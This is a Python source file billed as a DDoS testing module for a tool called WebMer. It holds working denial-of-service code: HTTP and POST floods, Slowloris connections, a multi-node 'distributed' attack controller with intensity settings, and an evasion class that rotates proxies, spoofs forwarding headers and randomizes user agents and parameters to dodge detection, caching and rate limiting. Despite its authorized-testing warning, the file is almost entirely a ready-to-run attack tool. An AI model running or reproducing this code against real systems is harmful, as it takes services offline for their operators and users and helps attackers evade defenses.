#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS/DoS Testing Module for WebMer
Advanced Distributed Denial of Service Testing Framework
⚠️  WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import asyncio
import aiohttp
import time
import random
import threading
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from colorama import Fore, Style
import socket
import struct
import ssl
import json
import psutil
import requests
from urllib.parse import urlparse

class DDoSAttackModule:
    def __init__(self, target_url, max_workers=100, request_timeout=10):
        self.target_url = target_url
        self.max_workers = max_workers
        self.request_timeout = request_timeout
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.response_times = []
        self.attack_active = False
        
    async def http_flood_attack(self, duration=60, requests_per_second=200):
        """Real HTTP Flood Attack - High volume HTTP requests"""
        print(f"{Fore.RED}[*] Launching REAL HTTP Flood Attack on {self.target_url}")
        print(f"{Fore.YELLOW}[*] Duration: {duration}s, RPS: {requests_per_second}")
        print(f"{Fore.RED}[!] WARNING: This is a real DDoS attack - Use only with authorization!")
        
        self.attack_active = True
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(limit=self.max_workers)
        timeout = aiohttp.ClientTimeout(total=self.request_timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while self.attack_active and (time.time() - start_time) < duration:
                tasks = []
                
                for _ in range(requests_per_second):
                    if not self.attack_active:
                        break
                    task = asyncio.create_task(self._send_http_request(session))
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(1)  # Wait 1 second before next batch
        
        self.attack_active = False
        self._print_attack_results()
    
    async def _send_http_request(self, session):
        """Send single HTTP request"""
        try:
            start_time = time.time()
            
            # Random headers to avoid detection
            headers = {
                'User-Agent': self._get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': f'max-age={random.randint(0, 3600)}',
            }
            
            # Random parameters and query strings to bypass caching and rate limiting
            params = {
                'cache_buster': random.randint(1000000, 9999999),
                'timestamp': int(time.time() * 1000000),
                'random': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20)),
                'session_id': ''.join(random.choices('0123456789abcdef', k=32)),
                'request_id': random.randint(100000, 999999)
            }
            
            async with session.get(self.target_url, headers=headers, params=params) as response:
                response_time = time.time() - start_time
                self.response_times.append(response_time)
                self.successful_requests += 1
                self.total_requests += 1
                
        except Exception as e:
            self.failed_requests += 1
            self.total_requests += 1
    
    async def slowloris_attack(self, duration=300, connections=200):
        """Slowloris Attack - Keep connections open with slow headers"""
        print(f"{Fore.YELLOW}[*] Starting Slowloris Attack on {self.target_url}")
        print(f"{Fore.CYAN}[*] Duration: {duration}s, Connections: {connections}")
        
        self.attack_active = True
        start_time = time.time()
        
        tasks = []
        for _ in range(connections):
            task = asyncio.create_task(self._slowloris_connection(duration))
            tasks.append(task)
        
        await asyncio.gather(*tasks, return_exceptions=True)
        self.attack_active = False
        self._print_attack_results()
    
    async def _slowloris_connection(self, duration):
        """Single slowloris connection"""
        try:
            start_time = time.time()
            
            # Parse URL to get host and port
            url_parts = self.target_url.replace('https://', '').replace('http://', '')
            host = url_parts.split('/')[0].split(':')[0]
            port = 443 if 'https://' in self.target_url else 80
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            await asyncio.get_event_loop().run_in_executor(None, sock.connect, (host, port))
            
            # Send initial HTTP request
            request = f"GET /{url_parts.split('/', 1)[1] if '/' in url_parts else ''} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            
            await asyncio.get_event_loop().run_in_executor(None, sock.send, request.encode())
            
            # Keep sending headers slowly
            while self.attack_active and (time.time() - start_time) < duration:
                header = f"X-Random-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n"
                try:
                    await asyncio.get_event_loop().run_in_executor(None, sock.send, header.encode())
                    await asyncio.sleep(random.uniform(10, 15))  # Send headers slowly
                except:
                    break
            
            sock.close()
            self.successful_requests += 1
            
        except Exception as e:
            self.failed_requests += 1
    
    async def post_flood_attack(self, duration=60, requests_per_second=30):
        """POST Flood Attack with large payloads"""
        print(f"{Fore.YELLOW}[*] Starting POST Flood Attack on {self.target_url}")
        print(f"{Fore.CYAN}[*] Duration: {duration}s, RPS: {requests_per_second}")
        
        self.attack_active = True
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(limit=self.max_workers)
        timeout = aiohttp.ClientTimeout(total=self.request_timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while self.attack_active and (time.time() - start_time) < duration:
                tasks = []
                
                for _ in range(requests_per_second):
                    if not self.attack_active:
                        break
                    task = asyncio.create_task(self._send_post_request(session))
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(1)
        
        self.attack_active = False
        self._print_attack_results()
    
    async def _send_post_request(self, session):
        """Send POST request with large payload"""
        try:
            start_time = time.time()
            
            headers = {
                'User-Agent': self._get_random_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            # Generate large payload
            payload_size = random.randint(1024, 10240)  # 1KB to 10KB
            payload_data = {
                'data': 'A' * payload_size,
                'timestamp': int(time.time() * 1000),
                'random': random.random(),
                'cache_buster': random.randint(1000000, 9999999)
            }
            
            async with session.post(self.target_url, headers=headers, data=payload_data) as response:
                response_time = time.time() - start_time
                self.response_times.append(response_time)
                self.successful_requests += 1
                self.total_requests += 1
                
        except Exception as e:
            self.failed_requests += 1
            self.total_requests += 1
    
    def _get_random_user_agent(self):
        """Get random user agent to avoid detection"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        return random.choice(user_agents)
    
    def _print_attack_results(self):
        """Print attack statistics"""
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.YELLOW}  DDoS Attack Results")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"{Fore.CYAN}  Total Requests: {self.total_requests}")
        print(f"{Fore.GREEN}  Successful: {self.successful_requests}")
        print(f"{Fore.RED}  Failed: {self.failed_requests}")
        
        if self.response_times:
            avg_response_time = sum(self.response_times) / len(self.response_times)
            min_response_time = min(self.response_times)
            max_response_time = max(self.response_times)
            
            print(f"{Fore.YELLOW}  Average Response Time: {avg_response_time:.3f}s")
            print(f"{Fore.YELLOW}  Min Response Time: {min_response_time:.3f}s")
            print(f"{Fore.YELLOW}  Max Response Time: {max_response_time:.3f}s")
        
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
        print(f"{Fore.MAGENTA}  Success Rate: {success_rate:.2f}%")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    
    def stop_attack(self):
        """Stop the current attack"""
        self.attack_active = False
        print(f"{Fore.RED}[!] Attack stopped by user")

# Distributed DDoS Controller
class DistributedDDoSController:
    def __init__(self, target_url, node_count=5):
        self.target_url = target_url
        self.node_count = node_count
        self.attack_nodes = []
        
    async def launch_distributed_attack(self, attack_type="http_flood", duration=60, intensity="medium"):
        """Launch coordinated attack from multiple nodes"""
        print(f"{Fore.RED}[*] Launching Distributed DDoS Attack")
        print(f"{Fore.YELLOW}[*] Target: {self.target_url}")
        print(f"{Fore.YELLOW}[*] Nodes: {self.node_count}")
        print(f"{Fore.YELLOW}[*] Attack Type: {attack_type}")
        print(f"{Fore.YELLOW}[*] Duration: {duration}s")
        print(f"{Fore.YELLOW}[*] Intensity: {intensity}")
        
        # Configure intensity
        if intensity == "low":
            rps_per_node = 10
            workers_per_node = 20
        elif intensity == "medium":
            rps_per_node = 25
            workers_per_node = 50
        elif intensity == "high":
            rps_per_node = 50
            workers_per_node = 100
        else:  # extreme
            rps_per_node = 100
            workers_per_node = 200
        
        # Create attack nodes
        tasks = []
        for i in range(self.node_count):
            node = DDoSAttackModule(self.target_url, max_workers=workers_per_node)
            self.attack_nodes.append(node)
            
            if attack_type == "http_flood":
                task = asyncio.create_task(node.http_flood_attack(duration, rps_per_node))
            elif attack_type == "slowloris":
                task = asyncio.create_task(node.slowloris_attack(duration, workers_per_node))
            elif attack_type == "post_flood":
                task = asyncio.create_task(node.post_flood_attack(duration, rps_per_node))
            
            tasks.append(task)
            
            # Stagger node launches
            await asyncio.sleep(1)
        
        # Wait for all nodes to complete
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print combined results
        self._print_distributed_results()
    
    def _print_distributed_results(self):
        """Print combined results from all nodes"""
        total_requests = sum(node.total_requests for node in self.attack_nodes)
        total_successful = sum(node.successful_requests for node in self.attack_nodes)
        total_failed = sum(node.failed_requests for node in self.attack_nodes)
        
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.YELLOW}  DISTRIBUTED DDOS ATTACK RESULTS")
        print(f"{Fore.RED}{'='*70}")
        print(f"{Fore.CYAN}  Total Nodes: {self.node_count}")
        print(f"{Fore.CYAN}  Combined Requests: {total_requests}")
        print(f"{Fore.GREEN}  Combined Successful: {total_successful}")
        print(f"{Fore.RED}  Combined Failed: {total_failed}")
        
        if total_requests > 0:
            success_rate = (total_successful / total_requests * 100)
            print(f"{Fore.MAGENTA}  Overall Success Rate: {success_rate:.2f}%")
        
        print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}")

# Stress Testing Module
class StressTestModule:
    def __init__(self, target_url):
        self.target_url = target_url
        
    async def bandwidth_stress_test(self, duration=60, payload_size_mb=10):
        """Test server bandwidth capacity"""
        print(f"{Fore.CYAN}[*] Starting Bandwidth Stress Test")
        print(f"{Fore.YELLOW}[*] Payload Size: {payload_size_mb}MB per request")
        
        payload_size_bytes = payload_size_mb * 1024 * 1024
        large_payload = 'A' * payload_size_bytes
        
        ddos_module = DDoSAttackModule(self.target_url)
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(self.target_url, data={'large_data': large_payload}) as response:
                        await response.read()
                        print(f"{Fore.GREEN}[+] Large payload sent successfully")
            except Exception as e:
                print(f"{Fore.RED}[!] Large payload failed: {e}")
            
            await asyncio.sleep(5)  # Wait between large requests
    
    async def connection_exhaustion_test(self, max_connections=1000):
        """Test connection limit exhaustion"""
        print(f"{Fore.CYAN}[*] Starting Connection Exhaustion Test")
        print(f"{Fore.YELLOW}[*] Max Connections: {max_connections}")
        
        connections = []
        successful_connections = 0
        
        for i in range(max_connections):
            try:
                connector = aiohttp.TCPConnector()
                session = aiohttp.ClientSession(connector=connector)
                connections.append(session)
                successful_connections += 1
                
                if i % 100 == 0:
                    print(f"{Fore.YELLOW}[*] Established {i} connections")
                    
            except Exception as e:
                print(f"{Fore.RED}[!] Connection failed at {i}: {e}")
                break
        
        print(f"{Fore.GREEN}[+] Successfully established {successful_connections} connections")
        
        # Keep connections open for a while
        await asyncio.sleep(30)
        
        # Close all connections
        for session in connections:
            await session.close()
        
        print(f"{Fore.YELLOW}[*] All connections closed")

# DoS Detection Evasion
class DoSEvasionModule:
    def __init__(self):
        self.proxy_list = []
        self.user_agents = []
        
    def load_proxy_list(self, proxy_file):
        """Load proxy list from file"""
        try:
            with open(proxy_file, 'r') as f:
                self.proxy_list = [line.strip() for line in f.readlines()]
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxy_list)} proxies")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to load proxy list: {e}")
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if self.proxy_list:
            return random.choice(self.proxy_list)
        return None
    
    async def stealth_attack(self, target_url, duration=60):
        """Launch stealth attack with evasion techniques"""
        print(f"{Fore.CYAN}[*] Starting Stealth DDoS Attack with Evasion")
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            try:
                # Use random proxy if available
                proxy = self.get_random_proxy()
                
                # Random delays between requests
                delay = random.uniform(0.1, 2.0)
                await asyncio.sleep(delay)
                
                # Random request patterns
                connector = aiohttp.TCPConnector()
                timeout = aiohttp.ClientTimeout(total=random.randint(5, 15))
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    headers = {
                        'User-Agent': self._get_random_user_agent(),
                        'X-Forwarded-For': self._get_random_ip(),
                        'X-Real-IP': self._get_random_ip(),
                    }
                    
                    async with session.get(target_url, headers=headers, proxy=proxy) as response:
                        await response.read()
                        
            except Exception as e:
                continue
    
    def _get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0'
        ]
        return random.choice(user_agents)
    
    def _get_random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
